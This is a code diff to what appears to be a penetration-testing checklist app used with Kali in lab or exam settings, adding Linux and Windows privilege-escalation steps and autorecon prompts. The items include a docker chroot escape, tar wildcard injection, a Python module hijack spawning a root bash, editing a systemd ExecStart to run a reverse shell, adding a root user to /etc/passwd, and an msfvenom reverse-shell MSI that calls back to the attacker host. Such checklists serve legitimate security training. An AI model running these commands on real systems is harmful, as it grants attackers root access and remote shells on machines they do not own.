@@ -332,10 +332,14 @@ const PRIVESC_LINUX = [
   // — TIER 3: MEDIUM FREQUENCY (~10-15% of machines) —
   { id: "lp14", text: "In docker/lxd group? Container escape to mount host filesystem", cmd: "id && docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
   { id: "lp15", text: "Cron uses tar * or wildcards? Wildcard injection", cmd: "echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'" },
-  { id: "lp16", text: "Python library hijack — find writable modules imported by crons/services", cmd: "find /usr/lib/python* -writable -type f 2>/dev/null" },
+  { id: "lp16", text: "Python library hijack — writable modules OR sudo python with hijackable imports", cmd: "find /usr/lib/python* /usr/local/lib/python* -writable 2>/dev/null && sudo -l | grep python" },
+  { id: "lp16a", text: "sudo python script found? Write fake module in same dir or set PYTHONPATH to writable dir", cmd: "# Read imports in script > write MODULE.py with: import os; os.system(\"/bin/bash\") > PYTHONPATH=/tmp sudo python3 /opt/script.py" },
   { id: "lp17", text: "Find world-writable files — /etc/passwd, systemd services, PATH dirs", cmd: "find / -writable -type f 2>/dev/null | grep -v proc" },
+  { id: "lp17a", text: "Writable systemd service or timer? Modify ExecStart for root shell", cmd: "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null && systemctl list-timers --all" },
+  { id: "lp17b", text: "Exploit writable .service: change ExecStart, daemon-reload, restart", cmd: "# Edit ExecStart=/bin/bash -c REVERSE_SHELL then: systemctl daemon-reload && systemctl restart SVCNAME" },
   { id: "lp18", text: "Writable /etc/passwd? Add root user directly", cmd: "openssl passwd -1 hacker" },
   { id: "lp19", text: "Check for internal-only services to port forward", cmd: "ss -tlnp" },
+  { id: "lp19a", text: "SSH local port forward to reach localhost service from Kali", cmd: "ssh -L 8080:127.0.0.1:8080 user@$IP -N" },
   { id: "lp20", text: "DB creds in configs? Connect, dump users, crack, try SSH" },
   // — TIER 4: LOWER FREQUENCY BUT STILL SEEN —
   { id: "lp21", text: "NFS no_root_squash? Write SUID shell from Kali as root" },
@@ -367,6 +371,7 @@ const PRIVESC_WINDOWS = [
   { id: "wp16", text: "PowerShell transcripts — may reveal commands with creds", cmd: "dir /s /b C:\\*.txt 2>nul | findstr -i \"transcript output\"" },
   { id: "wp17", text: "KeePass database? Convert and crack", cmd: "dir /s /b C:\\*.kdbx 2>nul" },
   { id: "wp18", text: "UAC enabled? If disabled, any local admin = instant SYSTEM", cmd: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA" },
+  { id: "wp18a", text: "Internal-only service? SSH or plink port forward to reach from Kali", cmd: "plink.exe -ssh -L 8080:127.0.0.1:8080 user@KALI" },
   // — TIER 3: SERVICE-BASED PRIVESC —
   { id: "wp19", text: "AlwaysInstallElevated? Check both keys — if both 0x1, create MSI", cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul" },
   { id: "wp20", text: "Generate malicious MSI for AlwaysInstallElevated", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o evil.msi" },
@@ -1240,6 +1245,7 @@ function StandaloneTab({mk,state,setState,creds,timers,setTimers}) {
         <MachineTimer elapsed={timer.elapsed} running={timer.running} onToggle={toggleTimer}/>
       </div>
       <HostHeader ip={ip} setIp={v=>s("ip",v)} hostname={hostname} setHostname={v=>s("hostname",v)} osVersion={osVersion} setOsVersion={v=>s("osVersion",v)} scanCmd="sudo nmap -Pn -n $IP -sC -sV -p- --open -oN tcp.nmap"/>
+      <div style={{display:"flex",alignItems:"center",gap:6,padding:"2px 8px",background:"rgba(255,170,0,0.04)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}><input type="checkbox" style={{accentColor:"#ffaa00"}}/><span style={{fontSize:10.5,fontFamily:"monospace",color:"#ffaa00",fontWeight:700}}>Run autorecon in background:</span><span style={{fontSize:10,fontFamily:"monospace",color:"#6b7f94",marginLeft:4}}>autorecon $IP --single-target --heartbeat 30</span></div>
       <UdpReminder ip={ip} udpDone={udpDone} onDone={()=>s("udpDone",true)}/>
       <PortSelector ports={ports} dismissed={dismissed} onAdd={addPort} onDismiss={dismiss} onRestore={restore} portServiceMap={portServiceMap} onSetService={setService}/>
       <NmapPaste onAddPorts={addPorts}/>
@@ -1441,6 +1447,7 @@ function ADTab({state,setState,creds,timers,setTimers}) {
 
       {/* Host header + ports */}
       <HostHeader ip={ip} setIp={v=>setMState({...mState,ip:v})} hostname={hostname} setHostname={v=>setMState({...mState,hostname:v})} osVersion={mState.osVersion||""} setOsVersion={v=>setMState({...mState,osVersion:v})} scanCmd="sudo nmap -Pn -n $IP -sC -sV -p- --open"/>
+      <div style={{display:"flex",alignItems:"center",gap:6,padding:"2px 8px",background:"rgba(255,170,0,0.04)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}><input type="checkbox" style={{accentColor:"#ffaa00"}}/><span style={{fontSize:10.5,fontFamily:"monospace",color:"#ffaa00",fontWeight:700}}>Autorecon all AD hosts:</span><span style={{fontSize:10,fontFamily:"monospace",color:"#6b7f94",marginLeft:4}}>autorecon $MS01 $MS02 $DC --heartbeat 30</span></div>
       <PortSelector ports={ports} dismissed={dismissed||[]} onAdd={addPort} onDismiss={dismiss} onRestore={restore} portServiceMap={mPortServiceMap} onSetService={setMService}/>
       <NmapPaste onAddPorts={addPorts}/>
       <AttackChain chain={chain||[]} setChain={v=>setMState({...mState,chain:v})}/>
